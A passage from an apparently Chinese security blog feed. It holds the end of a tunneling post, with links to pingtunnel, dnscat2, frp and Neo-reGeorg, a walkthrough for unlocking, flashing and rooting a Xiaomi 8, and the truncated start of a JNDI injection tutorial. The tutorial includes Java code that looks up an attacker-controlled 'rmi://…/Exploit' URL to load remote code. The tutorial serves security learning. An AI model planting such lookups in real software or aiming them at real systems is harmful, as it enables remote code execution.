title="八、总结"></a>八、总结</h2><p>通过学习隧道相关知识，选取了部分工具重新熟悉了各种隧道的搭建，虽然协议上有些许差异，但其逻辑上大差不差。文章主要还是工具上的使用以及协议上的理解。</p><h2 id="九、参考"><a href="#九、参考" class="headerlink" title="九、参考"></a>九、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/DlhqE6Yxo9IEXBKRl5epIA</span><br><span class="line">https://github.com/esrrhs/pingtunnel</span><br><span class="line">https://forum.butian.net/share/400</span><br><span class="line">https://github.com/iagox86/dnscat2</span><br><span class="line">https://cloud.tencent.com/developer/article/2130053</span><br><span class="line">https://xz.aliyun.com/t/2214</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/120748587</span><br><span class="line">https://mp.weixin.qq.com/s/RiFrP2IurA3Z5JcmWE0Vfg</span><br><span class="line">https://mp.weixin.qq.com/s/_g3rXXyq7HxMM1FVhs2Y1g</span><br><span class="line">https://github.com/fatedier/frp</span><br><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> 隧道搭建 </tag>
            
            <tag> HTTP </tag>
            
            <tag> SOCKS </tag>
            
            <tag> ICMP </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP测试系列-小米8 线刷 Pixel Experience</title>
      <link href="/2023/04/04/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%B0%8F%E7%B1%B38%20%E7%BA%BF%E5%88%B7%20Pixel%20Experience/"/>
      <url>/2023/04/04/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%B0%8F%E7%B1%B38%20%E7%BA%BF%E5%88%B7%20Pixel%20Experience/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/Pixel/title.png" data-caption="Hello Android"><img src="/../images/Pixel/title.png" alt="Hello Android"></a></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>前段时间有个需求要测试个Android APP，由于 APP 权限问题，自用手机无法进行正常打开，当时旁边有位同事刚好有台 Pixel ，玩了一下体验还不错，测试也能顺利的进行，当完成测试已经周五了，刚好手头上有台闲置的手机，于是乎利用周末时间从 0 到 1 了解了一下刷机知识，刷入了Pixel Experience，记录一下过程。</p><h2 id="二、刷机知识"><a href="#二、刷机知识" class="headerlink" title="二、刷机知识"></a>二、刷机知识</h2><h3 id="线刷与卡刷"><a href="#线刷与卡刷" class="headerlink" title="线刷与卡刷"></a>线刷与卡刷</h3><p><strong>线刷：</strong>刷了官方 ROM 的 recovery.img 刷机方式就是线刷,指使用USB线连接个人计算机，并在个人计算机上使用刷机软件进行刷机。</p><p><strong>卡刷：</strong>刷了第三方中文 recovery.img 刷机方式就是卡刷，卡刷则是把固件或者升级包拷贝到手机SD卡中进行刷机升级操作。</p><h3 id="底包"><a href="#底包" class="headerlink" title="底包"></a>底包</h3><p>指的是官方的线刷包，也就是官方的ROM，在刷入第三方原生系统的时候需要先刷入官方底包，因为这些原生系统中不带官方底层分区文件，需要底包作为一个衔接的作用。</p><h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><p>Recovery 为 Android 手机备份功能，可以对安卓手机内部的数据或系统进行修改的模式，类似于 Windows 的 PE ，每个手机都自带 Recovery ，关机状态下，按住手机电源键和音量+键，直到亮屏，松开就可以进入本机 Recovery，每个厂商的 Recovery 界面或会不同，功能功能上也会有所区别，一般所以一般刷机会选择输入第三方的 Recovery ，功能上会多一点，这就是通常刷机文章上出现刷入 Recovery。</p><h2 id="三、刷机过程"><a href="#三、刷机过程" class="headerlink" title="三、刷机过程"></a>三、刷机过程</h2><h3 id="小米8-解锁-BL"><a href="#小米8-解锁-BL" class="headerlink" title="小米8 解锁 BL"></a>小米8 解锁 BL</h3><p>BL（Bootloader） 启动加载程序。<strong>BL锁</strong> 是由手机厂商在手机出厂的时候就设置好的，防止用户对手机系统进行更改。</p><p>首先需要在手机上绑定小米账号，系统设置中找到 <strong>MIUI版本</strong> 多次点击进入开发者模式，查看设备解锁状态 <code>设置-》更多设置-》开发者模式-》设备解锁状态</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182507946.png" data-caption="image-20230319182507946"><img src="/../images/Pixel/image-20230319182507946.png" alt="image-20230319182507946"></a></p><p>点击绑定账户和设备</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318124214979.png" data-caption="image-20230318124214979"><img src="/../images/Pixel/image-20230318124214979.png" alt="image-20230318124214979"></a></p><p>小米官方提供 BL 解锁 <a href="http://www.miui.com/unlock/index.html">http://www.miui.com/unlock/index.html</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318122930624.png" data-caption="image-20230318122930624"><img src="/../images/Pixel/image-20230318122930624.png" alt="image-20230318122930624"></a></p><p>下载解锁工具</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318123032825.png" data-caption="image-20230318123032825"><img src="/../images/Pixel/image-20230318123032825.png" alt="image-20230318123032825"></a></p><p>双击打开 miflash_unlock.exe 软件</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130008889.png" data-caption="image-20230318130008889"><img src="/../images/Pixel/image-20230318130008889.png" alt="image-20230318130008889"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130023826.png" data-caption="image-20230318130023826"><img src="/../images/Pixel/image-20230318130023826.png" alt="image-20230318130023826"></a></p><p>登录刚才登录手机的小米账号</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130037610.png" data-caption="image-20230318130037610"><img src="/../images/Pixel/image-20230318130037610.png" alt="image-20230318130037610"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404213706121.png" data-caption="image-20230404213706121"><img src="/../images/Pixel/image-20230404213706121.png" alt="image-20230404213706121"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404213754974.png" data-caption="image-20230404213754974"><img src="/../images/Pixel/image-20230404213754974.png" alt="image-20230404213754974"></a></p><p>在进入 BL 解锁前，需在开发者模式中将 USB 调试开启</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318130742747.png" data-caption="image-20230318130742747"><img src="/../images/Pixel/image-20230318130742747.png" alt="image-20230318130742747"></a></p><p>接下来将手机关机 <code>长按电源键+音量减</code> 进入 <code>fastboot</code>  模式,然后使用具备数据传输的数据线连接手机</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182703137.png" data-caption="image-20230319182703137"><img src="/../images/Pixel/image-20230319182703137.png" alt="image-20230319182703137"></a></p><p>插入手机后，解锁功能还是无法点击，检测驱动是否正确安装</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404213840722.png" data-caption="image-20230404213840722"><img src="/../images/Pixel/image-20230404213840722.png" alt="image-20230404213840722"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214041979.png" data-caption="image-20230404214041979"><img src="/../images/Pixel/image-20230404214041979.png" alt="image-20230404214041979"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214105264.png" data-caption="image-20230404214105264"><img src="/../images/Pixel/image-20230404214105264.png" alt="image-20230404214105264"></a></p><p>点击确认解锁，注意解锁后相当于重装系统了，资料需提前备份</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214126997.png" data-caption="image-20230404214126997"><img src="/../images/Pixel/image-20230404214126997.png" alt="image-20230404214126997"></a></p><p>BL 解锁部分就已经完成了</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230404214146559.png" data-caption="image-20230404214146559"><img src="/../images/Pixel/image-20230404214146559.png" alt="image-20230404214146559"></a></p><p>重启手机后，开发者模式可查看设备解锁状态</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318132210299.png" data-caption="image-20230318132210299"><img src="/../images/Pixel/image-20230318132210299.png" alt="image-20230318132210299"></a></p><h3 id="刷入底包"><a href="#刷入底包" class="headerlink" title="刷入底包"></a>刷入底包</h3><p>这一部分需要到官方下载一个底包，也就是对应自身手机 Miui 版本的<a href="https://web.vip.miui.com/page/info/mio/mio/detail?postId=5817588&fromPathname=mioSingleBoard&app_version=dev.35000">线刷包</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319165801972.png" data-caption="image-20230319165801972"><img src="/../images/Pixel/image-20230319165801972.png" alt="image-20230319165801972"></a></p><p>我的是 MIUI 版本是 12.0.3.0，点击下载线刷包</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319170319361.png" data-caption="image-20230319170319361"><img src="/../images/Pixel/image-20230319170319361.png" alt="image-20230319170319361"></a></p><p>1、手机关机进入 <code>FASTBOOT</code> 模式 <code>关机键+音量减键</code>，使用具备传输数据的 USB 线连接手机</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318125409183.png" data-caption="image-20230318125409183"><img src="/../images/Pixel/image-20230318125409183.png" alt="image-20230318125409183"></a></p><p>2、使用官方的 MiFlash 工具刷入底包,双击 XiaoMiFlash.exe，软件下载地址 <a href="https://miuiver.com/miflash/">https://miuiver.com/miflash/</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318205740379.png" data-caption="image-20230318205740379"><img src="/../images/Pixel/image-20230318205740379.png" alt="image-20230318205740379"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318212413538.png" data-caption="image-20230318212413538"><img src="/../images/Pixel/image-20230318212413538.png" alt="image-20230318212413538"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318210409029.png" data-caption="image-20230318210409029"><img src="/../images/Pixel/image-20230318210409029.png" alt="image-20230318210409029"></a></p><p>刷入底包完毕后出现报错 <strong>Not catch checkpoint</strong> ,新版 MiFlash 在刷机完成后会检测手机是否已上 BL 锁，如果选择“全部删除”或“保留用户数据”这两种刷机模式，因为没有锁定 BL 锁，就会触发这个错误显示，所以这个报错问题不大。继续下一步即可</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318214541936.png" data-caption="image-20230318214541936"><img src="/../images/Pixel/image-20230318214541936.png" alt="image-20230318214541936"></a></p><p>手机已刷入底包，自动重启，数据已清除</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182815459.png" data-caption="image-20230319182815459"><img src="/../images/Pixel/image-20230319182815459.png" alt="image-20230319182815459"></a></p><h3 id="刷入TWRP-Recovery"><a href="#刷入TWRP-Recovery" class="headerlink" title="刷入TWRP Recovery"></a>刷入TWRP Recovery</h3><p>这一部分网上大多使用一键刷入脚本，本人就在这一步躺坑，因为版本的问题导致一直无法成功刷入 <code>Pixel Experience</code> 所以这一步还是建议自己手动刷一下，步骤也是非常简单的。</p><p>1、下载 <code>fastboot.exe</code> 工具，下载连接如下：<br><a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn</a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171214916.png" data-caption="image-20230319171214916"><img src="/../images/Pixel/image-20230319171214916.png" alt="image-20230319171214916"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171228496.png" data-caption="image-20230319171228496"><img src="/../images/Pixel/image-20230319171228496.png" alt="image-20230319171228496"></a></p><p>2、下载  TWRP，下载地址 <a href="https://dl.twrp.me/dipper/">https://dl.twrp.me/dipper/</a> 我这边下载了最新的版本</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171338443.png" data-caption="image-20230319171338443"><img src="/../images/Pixel/image-20230319171338443.png" alt="image-20230319171338443"></a></p><p>3、利用  <code>fastboot.exe</code> 工具刷入<code> TWRP Recovery</code>，首先再次关机进入 <code>fastboot</code> 模式，连接数据线</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318125409183.png" data-caption="image-20230318125409183"><img src="/../images/Pixel/image-20230318125409183.png" alt="image-20230318125409183"></a></p><p>再执行命令</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 注意该命令为 fastboot.exe 与 twrp-3.7.0_9-0-dipper.img 同目录下生效，若不同路径请自行修改</span><br><span class="line">fastboot.exe flash recovery twrp-3.7.0_9-0-dipper.img</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319171826726.png" data-caption="image-20230319171826726"><img src="/../images/Pixel/image-20230319171826726.png" alt="image-20230319171826726"></a></p><p>成功刷入后，手机会自动进入 <code>Recovery</code> 初始化，设置一个进入 <code>Recovery</code> 的密码,注意这个密码是你的开机密码，若你开机密码改变了，下次进入 <code>Recovery</code> 的密码也要改为你开机密码才能进入</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182902803.png" data-caption="image-20230319182902803"><img src="/../images/Pixel/image-20230319182902803.png" alt="image-20230319182902803"></a></p><p>设置密码后出现以下界面，直接滑动即可（右下角 Select language 可选择中文）</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182957100.png" data-caption="image-20230319182957100"><img src="/../images/Pixel/image-20230319182957100.png" alt="image-20230319182957100"></a></p><p>现在已经成功刷入第三方的 <code>Recovery</code> 了</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318220949643.png" data-caption="image-20230318220949643"><img src="/../images/Pixel/image-20230318220949643.png" alt="image-20230318220949643"></a></p><h3 id="刷入-Pixel-Experience"><a href="#刷入-Pixel-Experience" class="headerlink" title="刷入 Pixel_Experience"></a>刷入 Pixel_Experience</h3><p>Pixel_Experience 刷机包官方下载地址 <a href="https://get.pixelexperience.org/dipper">https://get.pixelexperience.org/dipper</a> 由于我的版本不是最新的，本人版本 PixelExperience_dipper-11.0-20211013-1655-OFFICIAL，下载地址 <a href="https://pan.baidu.com/s/1iVNriq07_2Flqi1Zs6Jw3g">https://pan.baidu.com/s/1iVNriq07_2Flqi1Zs6Jw3g</a> 提取码 emvv</p><p>1、手机进入 <code>Recovery </code>模式下，点击清除</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173327421.png" data-caption="image-20230319173327421"><img src="/../images/Pixel/image-20230319173327421.png" alt="image-20230319173327421"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173358908.png" data-caption="image-20230319173358908"><img src="/../images/Pixel/image-20230319173358908.png" alt="image-20230319173358908"></a></p><p>选择这四项进行清除</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173443733.png" data-caption="image-20230319173443733"><img src="/../images/Pixel/image-20230319173443733.png" alt="image-20230319173443733"></a></p><p>清除完成了点击返回，继续清除 data</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173517976.png" data-caption="image-20230319173517976"><img src="/../images/Pixel/image-20230319173517976.png" alt="image-20230319173517976"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173534934.png" data-caption="image-20230319173534934"><img src="/../images/Pixel/image-20230319173534934.png" alt="image-20230319173534934"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173551822.png" data-caption="image-20230319173551822"><img src="/../images/Pixel/image-20230319173551822.png" alt="image-20230319173551822"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173644133.png" data-caption="image-20230319173644133"><img src="/../images/Pixel/image-20230319173644133.png" alt="image-20230319173644133"></a></p><p>重新启动 <code>Recovery</code> 利用数据线连接电脑后将 <code>Pixel_Experience</code> 刷机包复制到手机内存上</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318221129791.png" data-caption="image-20230318221129791"><img src="/../images/Pixel/image-20230318221129791.png" alt="image-20230318221129791"></a></p><p>在 <code>Recovery</code> 处找到 <code>Pixel_Experience</code> 刷机包后直接点击开始刷机</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319173748614.png" data-caption="image-20230319173748614"><img src="/../images/Pixel/image-20230319173748614.png" alt="image-20230319173748614"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174211074.png" data-caption="image-20230319174211074"><img src="/../images/Pixel/image-20230319174211074.png" alt="image-20230319174211074"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174232708.png" data-caption="image-20230319174232708"><img src="/../images/Pixel/image-20230319174232708.png" alt="image-20230319174232708"></a></p><p>完成后先点击清除，再重启手机进入系统</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174303819.png" data-caption="image-20230319174303819"><img src="/../images/Pixel/image-20230319174303819.png" alt="image-20230319174303819"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174354316.png" data-caption="image-20230319174354316"><img src="/../images/Pixel/image-20230319174354316.png" alt="image-20230319174354316"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319174631189.png" data-caption="image-20230319174631189"><img src="/../images/Pixel/image-20230319174631189.png" alt="image-20230319174631189"></a></p><h3 id="刷入-Magisk-实现-Root"><a href="#刷入-Magisk-实现-Root" class="headerlink" title="刷入 Magisk 实现 Root"></a>刷入 Magisk 实现 Root</h3><p>1、下载 Magisk.apk <a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a> 将其后缀名改为.zip,使用 <code>Recovery</code> 刷入，刷入后重启手机安装正常的 <code>magisk.apk</code> 即可正常恢复 <code>root</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319180829569.png" data-caption="image-20230319180829569"><img src="/../images/Pixel/image-20230319180829569.png" alt="image-20230319180829569"></a></p><p>2、进入 <code>Recovery</code> 将 <code>Magisk-v25.2.zip</code> 刷入到手机</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181732161.png" data-caption="image-20230319181732161"><img src="/../images/Pixel/image-20230319181732161.png" alt="image-20230319181732161"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181807960.png" data-caption="image-20230319181807960"><img src="/../images/Pixel/image-20230319181807960.png" alt="image-20230319181807960"></a></p><p>刷完后点击清除 ，再重启即可</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181848655.png" data-caption="image-20230319181848655"><img src="/../images/Pixel/image-20230319181848655.png" alt="image-20230319181848655"></a></p><p>因为我们刷入的是 .zip 包，所以 Magisk 是无法正常使用的</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319181941395.png" data-caption="image-20230319181941395"><img src="/../images/Pixel/image-20230319181941395.png" alt="image-20230319181941395"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182044661.png" data-caption="image-20230319182044661"><img src="/../images/Pixel/image-20230319182044661.png" alt="image-20230319182044661"></a></p><p>我们找到刚才我们上传的 <code>Magisk.apk</code> 进行安装即可完成 <code>ROOT</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182159561.png" data-caption="image-20230319182159561"><img src="/../images/Pixel/image-20230319182159561.png" alt="image-20230319182159561"></a></p><p>出现版本号证明成功 <code>ROOT</code></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319182229824.png" data-caption="image-20230319182229824"><img src="/../images/Pixel/image-20230319182229824.png" alt="image-20230319182229824"></a></p><p>我们再上传两个模块，便于 <code>ROOT</code> 权限更好的使用，下载地址 <a href="https://github.com/RikkaApps/Riru">https://github.com/RikkaApps/Riru</a> 、<a href="https://github.com/LSPosed/LSPosed">https://github.com/LSPosed/LSPosed</a> 直接下载利用数据线拉到手机内存上</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319183957793.png" data-caption="image-20230319183957793"><img src="/../images/Pixel/image-20230319183957793.png" alt="image-20230319183957793"></a></p><p>手机 Magisk App 上进行本地安装即可，注意是先安装 Riru 再安装 LSPosed</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319185019989.png" data-caption="image-20230319185019989"><img src="/../images/Pixel/image-20230319185019989.png" alt="image-20230319185019989"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319185038023.png" data-caption="image-20230319185038023"><img src="/../images/Pixel/image-20230319185038023.png" alt="image-20230319185038023"></a></p><p>装完重启即可</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319185115904.png" data-caption="image-20230319185115904"><img src="/../images/Pixel/image-20230319185115904.png" alt="image-20230319185115904"></a></p><h2 id="四、注意事项"><a href="#四、注意事项" class="headerlink" title="四、注意事项"></a>四、注意事项</h2><h3 id="TWRP-Recovery"><a href="#TWRP-Recovery" class="headerlink" title="TWRP Recovery"></a>TWRP Recovery</h3><p>本次刷机过程中，由于 Recovery 刷入有问题，导致不断重试安装了多次，所以在刷入第三方 Recovery 还是选择手动较为稳妥。错误的标志，下图一为错误的刷入 Recovery 导致无法刷入Pixel Experience，图二为成功刷入 Pixel Experience。</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319175143604.png" data-caption="image-20230319175143604"><img src="/../images/Pixel/image-20230319175143604.png" alt="image-20230319175143604"></a></p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319175243609.png" data-caption="image-20230319175243609"><img src="/../images/Pixel/image-20230319175243609.png" alt="image-20230319175243609"></a></p><h3 id="无法进入系统，卡在开机"><a href="#无法进入系统，卡在开机" class="headerlink" title="无法进入系统，卡在开机"></a>无法进入系统，卡在开机</h3><p>在使用低版本的 <code>Recovery</code> 导致刷入 <code>Pixel Experience</code> 停留在开机处，无法进行正常的系统</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230319175529067.png" data-caption="image-20230319175529067"><img src="/../images/Pixel/image-20230319175529067.png" alt="image-20230319175529067"></a></p><p>这时候，我们可以使用小米的工具进行线刷重新刷回 MIUI ，步骤与输入底包方法一致，成功后会自动进行 MIUI 系统</p><p><a data-fancybox="gallery" data-src="/../images/Pixel/image-20230318212413538.png" data-caption="image-20230318212413538"><img src="/../images/Pixel/image-20230318212413538.png" alt="image-20230318212413538"></a></p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://www.xianshuabao.com/faq/xianshuawenti/98.html</span><br><span class="line">https://www.devgox.com/archives/1034.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/311264528</span><br><span class="line">https://blog.csdn.net/jingxuan2583/article/details/106847033</span><br><span class="line">https://www.bilibili.com/video/BV1PJ411d7yi/?spm_id_from=333.788.videocard.9</span><br><span class="line">https://www.youtube.com/watch?v=ZCIQloQCwOk</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://zhuanlan.zhihu.com/p/380610364</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷机 </tag>
            
            <tag> Pixel Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(七)-JNDI注入原理及利用考究</title>
      <link href="/2023/03/07/Java%E4%BB%A3%E7%A0%81%E5%AE%A1(%E4%B8%83)-JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E8%80%83%E7%A9%B6/"/>
      <url>/2023/03/07/Java%E4%BB%A3%E7%A0%81%E5%AE%A1(%E4%B8%83)-JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E8%80%83%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本篇文章作为  JNDI  注入学习的第一篇，主要了解其基本的原理及其利用，方便后续针对 JNDI 注入的学习，篇幅不长。</p><h2 id="二、JNDI-简介"><a href="#二、JNDI-简介" class="headerlink" title="二、JNDI 简介"></a>二、JNDI 简介</h2><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p><p>上面较官方说法，通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的 <code>命令服务</code>和<code>目录服务</code>,如下图。</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230307164854167.png" data-caption="官方图解"><img src="/../images/Java/jndi/image-20230307164854167.png" alt="官方图解"></a><br>本篇文章主要探究 LADP、RMI、DNS 协议。</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230307171510.png" data-caption="相关协议"><img src="/../images/Java/jndi/image-20230307171510.png" alt="相关协议"></a></p><h2 id="三、JNDI注入"><a href="#三、JNDI注入" class="headerlink" title="三、JNDI注入"></a>三、JNDI注入</h2><p><code>JNDI</code> 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p><p><strong>代码示例：</strong></p><p>代码中定义了 <code>uri</code> 变量，<code>uri</code> 变量可控，并定义了一个 <code>rmi</code> 协议服务， <code>rmi://127.0.0.1:1099/Exploit</code> 为攻击者控制的链接，最后使用 <code>lookup()</code> 函数进行远程获取 <code>Exploit</code> 类（Exploit 类名为攻击者定义，不唯一），并执行它</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>;<span class="comment">// 指定查找的 uri 变量</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri);<span class="comment">// 获取指定的远程对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>具体攻击流程图</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302200410650.png" data-caption="image-20230302200410650"><img src="/../images/Java/jndi/image-20230302200410650.png" alt="image-20230302200410650"></a></p><p>JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230307172530.png" data-caption="image-20230302200410650"><img src="/../images/Java/jndi/image-20230307172530.png" alt="image-20230302200410650"></a></p><h2 id="四、JNDI-注入复现"><a href="#四、JNDI-注入复现" class="headerlink" title="四、JNDI 注入复现"></a>四、JNDI 注入复现</h2><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>使用 IDEA 进行复现，这边使用的 JDK 版本为 Linux 版本的 <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox">JDK 7u79</a> ， <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox">Windows 版本下载</a> </p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302200701717.png" data-caption="image-20230302200701717"><img src="/../images/Java/jndi/image-20230302200701717.png" alt="image-20230302200701717"></a></p><p>1、首先 IDEA 